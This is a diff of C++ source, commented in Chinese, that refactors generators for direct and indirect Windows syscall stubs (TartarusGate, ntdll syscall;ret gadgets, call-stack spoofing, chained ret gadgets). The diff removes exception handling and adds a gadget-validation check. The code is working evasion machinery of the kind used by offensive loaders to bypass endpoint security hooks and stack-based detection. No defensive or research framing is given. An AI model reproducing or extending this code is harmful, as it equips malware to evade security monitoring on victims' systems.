@@ -558,32 +558,27 @@ std::vector<uintptr_t> GetRetGadgets(size_t count) {
 // ============================================================
 
 void* TartarusGate::GenerateSyscallStub(DWORD ssn) {
-    __try {
-        BYTE stubCode[] = {
-            0x4C, 0x8B, 0xD1,             // mov r10, rcx
-            0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, <SSN>
-            0x0F, 0x05,                    // syscall
-            0xC3                            // ret
-        };
-        *reinterpret_cast<DWORD*>(stubCode + 4) = ssn;
+    BYTE stubCode[] = {
+        0x4C, 0x8B, 0xD1,             // mov r10, rcx
+        0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, <SSN>
+        0x0F, 0x05,                    // syscall
+        0xC3                            // ret
+    };
+    *reinterpret_cast<DWORD*>(stubCode + 4) = ssn;
 
-        void* execMem = VirtualAlloc(nullptr, sizeof(stubCode),
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (!execMem) return nullptr;
+    void* execMem = VirtualAlloc(nullptr, sizeof(stubCode),
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!execMem) return nullptr;
 
-        memcpy(execMem, stubCode, sizeof(stubCode));
+    memcpy(execMem, stubCode, sizeof(stubCode));
 
-        DWORD oldProtect;
-        if (!VirtualProtect(execMem, sizeof(stubCode), PAGE_EXECUTE_READ, &oldProtect)) {
-            VirtualFree(execMem, 0, MEM_RELEASE);
-            return nullptr;
-        }
-        FlushInstructionCache(GetCurrentProcess(), execMem, sizeof(stubCode));
-        return execMem;
-    }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    DWORD oldProtect;
+    if (!VirtualProtect(execMem, sizeof(stubCode), PAGE_EXECUTE_READ, &oldProtect)) {
+        VirtualFree(execMem, 0, MEM_RELEASE);
         return nullptr;
     }
+    FlushInstructionCache(GetCurrentProcess(), execMem, sizeof(stubCode));
+    return execMem;
 }
 
 bool TartarusGate::ExecuteViaNtContinue(
@@ -677,43 +672,53 @@ SyscallMethod DecideMethod(SyscallMethod requested) {
 // 执行间接 syscall 的 stub 生成
 // 生成的代码: jmp [ntdll.syscall_ret_gadget]
 // 调用栈效果: 调用者 → ntdll.syscall → ntdll.ret → 调用者
+// 安全验证: 检查地址是否指向有效的 syscall;ret gadget
+static bool IsValidSyscallGadget(uintptr_t addr) {
+    if (!addr) return false;
+    MEMORY_BASIC_INFORMATION mbi;
+    if (!VirtualQuery((LPCVOID)addr, &mbi, sizeof(mbi))) return false;
+    if (!(mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)))
+        return false;
+    if (mbi.RegionSize < 3) return false;
+    // 检查 gadget 所在页有效后, 直接读字节验证 0F 05 C3
+    volatile BYTE b0 = *(volatile BYTE*)(addr);
+    volatile BYTE b1 = *(volatile BYTE*)(addr + 1);
+    volatile BYTE b2 = *(volatile BYTE*)(addr + 2);
+    return (b0 == 0x0F && b1 == 0x05 && b2 == 0xC3);
+}
+
 void* GenerateIndirectSyscallStub(DWORD ssn, uintptr_t syscallRetGadget) {
-    if (!syscallRetGadget) return nullptr;
+    if (!IsValidSyscallGadget(syscallRetGadget)) return nullptr;
 
-    __try {
-        BYTE stubCode2[] = {
-            0x4C, 0x8B, 0xD1,             // mov r10, rcx
-            0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, <SSN>
-            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, <gadget_addr>
-            0xFF, 0xE0                     // jmp rax
-        };
-        *reinterpret_cast<DWORD*>(stubCode2 + 4) = ssn;
-        *reinterpret_cast<uintptr_t*>(stubCode2 + 10) = syscallRetGadget;
+    BYTE stubCode2[] = {
+        0x4C, 0x8B, 0xD1,             // mov r10, rcx
+        0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, <SSN>
+        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, <gadget_addr>
+        0xFF, 0xE0                     // jmp rax
+    };
+    *reinterpret_cast<DWORD*>(stubCode2 + 4) = ssn;
+    *reinterpret_cast<uintptr_t*>(stubCode2 + 10) = syscallRetGadget;
 
-        void* execMem = VirtualAlloc(nullptr, sizeof(stubCode2),
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (!execMem) return nullptr;
+    void* execMem = VirtualAlloc(nullptr, sizeof(stubCode2),
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!execMem) return nullptr;
 
-        memcpy(execMem, stubCode2, sizeof(stubCode2));
+    memcpy(execMem, stubCode2, sizeof(stubCode2));
 
-        DWORD oldProtect;
-        if (!VirtualProtect(execMem, sizeof(stubCode2), PAGE_EXECUTE_READ, &oldProtect)) {
-            VirtualFree(execMem, 0, MEM_RELEASE);
-            return nullptr;
-        }
-        FlushInstructionCache(GetCurrentProcess(), execMem, sizeof(stubCode2));
-        return execMem;
-    }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    DWORD oldProtect;
+    if (!VirtualProtect(execMem, sizeof(stubCode2), PAGE_EXECUTE_READ, &oldProtect)) {
+        VirtualFree(execMem, 0, MEM_RELEASE);
         return nullptr;
     }
+    FlushInstructionCache(GetCurrentProcess(), execMem, sizeof(stubCode2));
+    return execMem;
 }
 
 // 生成带 Call Stack Spoofing 的间接 syscall stub
 // 基于 SindriKit 1.3.0 的栈布局
 void* GenerateSpoofedSyscallStub(DWORD ssn, uintptr_t syscallRetGadget,
                                   const CallStackSpoofContext& spoofCtx) {
-    if (!syscallRetGadget || !spoofCtx.trampolineGadget) return nullptr;
+    if (!IsValidSyscallGadget(syscallRetGadget) || !spoofCtx.trampolineGadget) return nullptr;
 
     // 栈布局 (从上到下):
     // [rsp+0]  = trampolineGadget (RET 在 Fat Frame 中)
@@ -783,65 +788,60 @@ void* GenerateDeepSpoofStub(DWORD ssn, uintptr_t syscallRetGadget,
                              const std::vector<uintptr_t>& retGadgets,
                              const CallStackSpoofContext& spoofCtx)
 {
-    if (!syscallRetGadget || retGadgets.empty()) return nullptr;
+    if (!IsValidSyscallGadget(syscallRetGadget) || retGadgets.empty()) return nullptr;
 
     size_t chainCount = std::min(retGadgets.size(), (size_t)32);
     if (chainCount < 4) return nullptr;
 
-    __try {
-        const size_t codeHeaderSize = 1 + 1 + 3 + 5 + 7 + 3;
-        const size_t totalCodeSize = codeHeaderSize + chainCount * 6;
-        const size_t dataSectionSize = (chainCount + 1) * 8;
-        const size_t totalSize = totalCodeSize + dataSectionSize;
+    const size_t codeHeaderSize = 1 + 1 + 3 + 5 + 7 + 3;
+    const size_t totalCodeSize = codeHeaderSize + chainCount * 6;
+    const size_t dataSectionSize = (chainCount + 1) * 8;
+    const size_t totalSize = totalCodeSize + dataSectionSize;
 
-        std::vector<BYTE> stub(totalSize, 0x90);
+    std::vector<BYTE> stub(totalSize, 0x90);
 
-        BYTE* codePtr = stub.data();
-        BYTE* dataPtr = stub.data() + totalCodeSize;
+    BYTE* codePtr = stub.data();
+    BYTE* dataPtr = stub.data() + totalCodeSize;
 
-        // ---- 代码段 ----
-        size_t offset = 0;
+    // ---- 代码段 ----
+    size_t offset = 0;
 
-        codePtr[offset++] = 0x58;                         // pop rax
-        codePtr[offset++] = 0x50;                         // push rax
+    codePtr[offset++] = 0x58;                         // pop rax
+    codePtr[offset++] = 0x50;                         // push rax
 
-        for (size_t i = 0; i < chainCount; i++) {
-            codePtr[offset++] = 0xFF;                     // push [rip+disp32]
-            codePtr[offset++] = 0x35;
-            int32_t disp = static_cast<int32_t>(totalCodeSize - offset - 4 + i * 8);
-            *reinterpret_cast<int32_t*>(codePtr + offset) = disp;
-            offset += 4;
-        }
-
-        codePtr[offset++] = 0x4C; codePtr[offset++] = 0x8B; codePtr[offset++] = 0xD1; // mov r10, rcx
-        codePtr[offset++] = 0xB8; *reinterpret_cast<DWORD*>(codePtr + offset) = ssn; offset += 4; // mov eax, SSN
-        codePtr[offset++] = 0x4C; codePtr[offset++] = 0x8B; codePtr[offset++] = 0x1D; // mov r11, [rip+disp]
-        int32_t syscDisp = static_cast<int32_t>(totalCodeSize + chainCount * 8 - offset - 4);
-        *reinterpret_cast<int32_t*>(codePtr + offset) = syscDisp; offset += 4;
-        codePtr[offset++] = 0x41; codePtr[offset++] = 0xFF; codePtr[offset++] = 0xE3; // jmp r11
-
-        // ---- 数据段 ----
-        for (size_t i = 0; i < chainCount; i++)
-            *reinterpret_cast<uintptr_t*>(dataPtr + i * 8) = retGadgets[i];
-        *reinterpret_cast<uintptr_t*>(dataPtr + chainCount * 8) = syscallRetGadget;
-
-        void* execMem = VirtualAlloc(nullptr, totalSize,
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (!execMem) return nullptr;
-
-        memcpy(execMem, stub.data(), totalSize);
-
-        DWORD oldProtect;
-        if (!VirtualProtect(execMem, totalSize, PAGE_EXECUTE_READ, &oldProtect)) {
-            VirtualFree(execMem, 0, MEM_RELEASE);
-            return nullptr;
-        }
-        FlushInstructionCache(GetCurrentProcess(), execMem, totalSize);
-        return execMem;
+    for (size_t i = 0; i < chainCount; i++) {
+        codePtr[offset++] = 0xFF;                     // push [rip+disp32]
+        codePtr[offset++] = 0x35;
+        int32_t disp = static_cast<int32_t>(totalCodeSize - offset - 4 + i * 8);
+        *reinterpret_cast<int32_t*>(codePtr + offset) = disp;
+        offset += 4;
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+
+    codePtr[offset++] = 0x4C; codePtr[offset++] = 0x8B; codePtr[offset++] = 0xD1; // mov r10, rcx
+    codePtr[offset++] = 0xB8; *reinterpret_cast<DWORD*>(codePtr + offset) = ssn; offset += 4; // mov eax, SSN
+    codePtr[offset++] = 0x4C; codePtr[offset++] = 0x8B; codePtr[offset++] = 0x1D; // mov r11, [rip+disp]
+    int32_t syscDisp = static_cast<int32_t>(totalCodeSize + chainCount * 8 - offset - 4);
+    *reinterpret_cast<int32_t*>(codePtr + offset) = syscDisp; offset += 4;
+    codePtr[offset++] = 0x41; codePtr[offset++] = 0xFF; codePtr[offset++] = 0xE3; // jmp r11
+
+    // ---- 数据段 ----
+    for (size_t i = 0; i < chainCount; i++)
+        *reinterpret_cast<uintptr_t*>(dataPtr + i * 8) = retGadgets[i];
+    *reinterpret_cast<uintptr_t*>(dataPtr + chainCount * 8) = syscallRetGadget;
+
+    void* execMem = VirtualAlloc(nullptr, totalSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!execMem) return nullptr;
+
+    memcpy(execMem, stub.data(), totalSize);
+
+    DWORD oldProtect;
+    if (!VirtualProtect(execMem, totalSize, PAGE_EXECUTE_READ, &oldProtect)) {
+        VirtualFree(execMem, 0, MEM_RELEASE);
         return nullptr;
     }
+    FlushInstructionCache(GetCurrentProcess(), execMem, totalSize);
+    return execMem;
 }
 
 // 通用 syscall 执行: 选择方法, 生成 stub, 调用
